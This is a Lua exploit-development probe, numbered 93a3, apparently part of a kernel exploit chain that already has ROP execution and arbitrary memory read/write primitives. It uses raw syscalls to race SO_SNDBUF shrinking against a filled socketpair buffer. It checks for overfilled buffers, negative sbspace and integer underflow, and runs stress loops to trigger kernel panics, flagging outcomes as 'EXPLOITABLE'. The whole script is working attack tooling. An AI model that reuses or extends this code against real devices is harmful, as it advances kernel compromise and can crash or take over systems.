-- CRASH_CLASS: MODERATE
-- PROBE 93a3: SO_SNDBUF race — verify kernel corruption
--
-- 93a2 showed 30/30 anomalies: sndbuf shrunk to 1 while 64KB buffered.
-- child_wrote=0xDEAD means the child ROP didn't run yet when we checked.
-- This probe:
--   1. Verifies the sb_cc > sb_hiwat condition is real (read back buffered data)
--   2. Gives the child MORE time to wake and write into the undersized buffer
--   3. Checks if close() on the overfull socket panics
--   4. Tests if repeated fill+shrink degrades kernel state

print("=== PROBE 93a3: SO_SNDBUF verify corruption ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local setval = memory.alloc(4)
local optval = memory.alloc(8)
local optlen = memory.alloc(8)
local fill_buf = memory.alloc(0x10000)
for i = 0, 0xFFFC, 4 do wd(N(fill_buf) + i, 0x43434343) end

-- [A] Verify: fill buffer, shrink hiwat, check readable data exceeds hiwat
print("[A] VERIFY — sb_cc > sb_hiwat after shrink")
for trial = 1, 5 do
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp) + 4, 0)
    mk(135)(uint64(1), uint64(1), uint64(0), sp)
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp) + 4) or -1

    -- Set large sndbuf
    wd(N(setval), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)

    -- Fill with MSG_DONTWAIT
    local filled = 0
    for fill = 1, 20 do
        local sr = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(4096), uint64(0x80)))
        if sr > 0 then filled = filled + sr else break end
    end

    -- Shrink to 1
    wd(N(setval), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)

    -- Read back sndbuf
    wd(N(optval), 0); wd(N(optlen), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
    local post_sb = rd(N(optval)) or 0

    -- Try to read ALL data from read side
    local total_read = 0
    local drain = memory.alloc(0x10000)
    for d = 1, 30 do
        local dr = sgn(mk(3)(uint64(fR), drain, uint64(0x4000)))
        if dr > 0 then total_read = total_read + dr else break end
    end

    -- NOW try another send — should this succeed with sb_hiwat=1?
    local extra = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(64), uint64(0x80)))

    print(string.format("  trial %d: filled=%d sndbuf=%d readable=%d extra_send=%d",
        trial, filled, post_sb, total_read, extra))

    -- The key question: can we write MORE than sb_hiwat?
    if extra > 0 and post_sb <= 64 then
        print("    *** DATA ACCEPTED PAST HIWAT — kernel allows overfill ***")
    end

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
    if not alive() then print("  *** DEAD ***"); break end
end

-- [B] Stress test: fill+shrink+write 100 times, check for panic
print("")
print("[B] STRESS — repeated overfill/shrink cycles")
local stress_ok = 0
for trial = 1, 100 do
    if not alive() then
        print(string.format("  trial %d: *** PROCESS DEAD ***", trial))
        break
    end

    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp) + 4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp) + 4) or -1
    if r ~= 0 then break end

    -- Set large, fill, shrink to 1
    wd(N(setval), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
    for fill = 1, 20 do
        local sr = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(4096), uint64(0x80)))
        if sr <= 0 then break end
    end
    wd(N(setval), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)

    -- Try to write into the overfull buffer
    local wr = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(256), uint64(0x80)))

    -- Close WITHOUT draining — mbuf chain is freed while sb_cc > sb_hiwat
    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
    stress_ok = stress_ok + 1

    if trial <= 3 or trial % 25 == 0 then
        print(string.format("  trial %d: write_ret=%d — ALIVE", trial, wr))
    elseif trial == 4 then
        print("  ...")
    end
end

-- [C] Negative sbspace test: fill to max, shrink, then try blocking write
print("")
print("[C] NEGATIVE SBSPACE — fill to max, shrink to 1, examine state")
if alive() then
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp) + 4, 0)
    mk(135)(uint64(1), uint64(1), uint64(0), sp)
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp) + 4) or -1

    -- Max fill
    wd(N(setval), 131072)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
    local filled = 0
    for fill = 1, 40 do
        local sr = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(0x4000), uint64(0x80)))
        if sr > 0 then filled = filled + sr else break end
    end

    -- Now shrink to 1
    wd(N(setval), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)

    wd(N(optval), 0); wd(N(optlen), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
    local post_sb = rd(N(optval)) or 0

    -- sbspace = sb_hiwat - sb_cc. If sb_hiwat=1 and sb_cc=131072, sbspace is NEGATIVE
    -- Try MSG_DONTWAIT write — should return EWOULDBLOCK but what if sbspace wraps?
    local wr = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(256), uint64(0x80)))
    local wr2 = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(1), uint64(0x80)))

    print(string.format("  filled=%d sndbuf=%d", filled, post_sb))
    print(string.format("  write(256, DONTWAIT)=%d write(1, DONTWAIT)=%d", wr, wr2))
    if wr > 0 or wr2 > 0 then
        print("  *** WRITES ACCEPTED WITH NEGATIVE SBSPACE — EXPLOITABLE ***")
    end

    -- Try shutdown(SHUT_WR) on overfull socket
    local shut = sgn(mk(134)(uint64(fW), uint64(1)))
    print(string.format("  shutdown(SHUT_WR)=%d", shut))

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

print("")
print("[SUMMARY]")
print(string.format("  stress cycles: %d", stress_ok))
print(string.format("  process: %s", alive() and "ALIVE" or "DEAD"))

if not alive() then
    print("*** KERNEL PANIC — SO_SNDBUF RACE EXPLOITABLE ***")
else
    print("Process survived. The kernel allows sb_cc > sb_hiwat without panic.")
    print("Next: test if the write path uses signed sbspace comparison (integer underflow)")
end

print("")
print("=== 93a3 COMPLETE ===")
